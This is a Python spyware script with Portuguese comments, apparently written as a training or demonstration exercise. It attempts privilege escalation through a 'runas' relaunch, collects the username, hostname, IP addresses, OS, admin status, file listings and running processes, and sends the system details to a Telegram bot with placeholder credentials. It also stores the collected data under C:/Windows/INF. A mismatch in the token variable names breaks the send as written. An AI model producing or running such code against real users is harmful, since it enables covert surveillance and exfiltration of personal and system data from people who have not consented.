import os
import socket
import platform
import psutil
import ctypes
import sys
from tkinter import messagebox, Tk
import requests

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

def obter_detalhes_sistema():
    """
    Coleta detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema = platform.platform()

        # Captura todos os IPs da máquina
        ips = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ips.append(addr.address)

        # Verifica privilégios administrativos
        privilegios = "Concedidos ✅" if verificar_admin() else "Não Concedidos ❌"

        detalhes = (
            f"🔎 <b>Detalhes do Sistema:</b>\n"
            f"👤 <b>Usuário:</b> {usuario}\n"
            f"💻 <b>Host:</b> {hostname}\n"
            f"🌐 <b>IPs:</b> {' | '.join(ips)}\n"
            f"🖥️ <b>Sistema:</b> {sistema}\n"
            f"🔐 <b>Privilégios Administrativos:</b> {privilegios}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"

def enviar_alerta_arquivo(nome_arquivo):
    """
    Envia alerta ao Telegram sobre a execução do arquivo.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = obter_detalhes_sistema()
    mensagem = (
        f"🔴 <b>ALERTA CRÍTICO: Spyware '{nome_arquivo}' foi ativado!</b>\n"
        f"📂 <b>Localização:</b> {pasta_atual}\n"
        f"{detalhes_sistema}"
    )
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except Exception as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}")

def verificar_admin():
    """
    Verifica se o script está sendo executado como administrador.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Erro ao verificar privilégios: {e}")
        return False

def escalar_privilegios():
    """
    Escala privilégios para administrador caso necessário.
    """
    if not verificar_admin():
        print("Tentando escalar privilégios...")
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, __file__, None, 1
            )
            os._exit(0)  # Saída limpa após escalar privilégios
        except Exception as e:
            print(f"Erro ao tentar escalar privilégios: {e}")
            os._exit(1)

def coletar_informacoes():
    """
    Simula a coleta de informações confidenciais e as armazena.
    """
    caminho_destino = "C:/Windows/INF/spyware_senai/"
    os.makedirs(caminho_destino, exist_ok=True)
    arquivo_info = os.path.join(caminho_destino, "coleta_informacoes.txt")

    informacoes = {
        "Usuário": os.getlogin(),
        "Sistema Operacional": platform.platform(),
        "Hostname": socket.gethostname(),
        "Diretório Atual": os.getcwd(),
        "Arquivos no Diretório Atual": os.listdir(),
        "Processos Ativos": [proc.info for proc in psutil.process_iter(['pid', 'name'])],
    }

    with open(arquivo_info, "w") as f:
        for chave, valor in informacoes.items():
            f.write(f"{chave}: {valor}\n")

    print(f"As informações foram coletadas e armazenadas em {arquivo_info}.")

def exibir_popup(txt_correspondente):
    """
    Exibe um pop-up estilo retro perguntando se o arquivo explicativo foi lido.
    """
    root = Tk()
    root.withdraw()  # Esconde a janela principal do Tkinter

    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{txt_correspondente}'?\n\n"
            "Por favor, leia antes de continuar."
        )

        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        elif resposta.lower() in ["no", "não", "nao"]:
            messagebox.showwarning("Leitura Necessária", "Por favor, leia o arquivo antes de continuar.")
            return False

if __name__ == "__main__":
    # Escala privilégios caso necessário
    escalar_privilegios()

    # Detecta o tipo do arquivo executado (.py ou .exe)
    nome_arquivo = os.path.basename(sys.argv[0])
    enviar_alerta_arquivo(nome_arquivo)

    # Pergunta ao usuário sobre o arquivo explicativo
    txt_correspondente = f"{os.path.splitext(nome_arquivo)[0]}.txt"
    if exibir_popup(txt_correspondente):
        print("Processo confirmado pelo usuário.")
        coletar_informacoes()
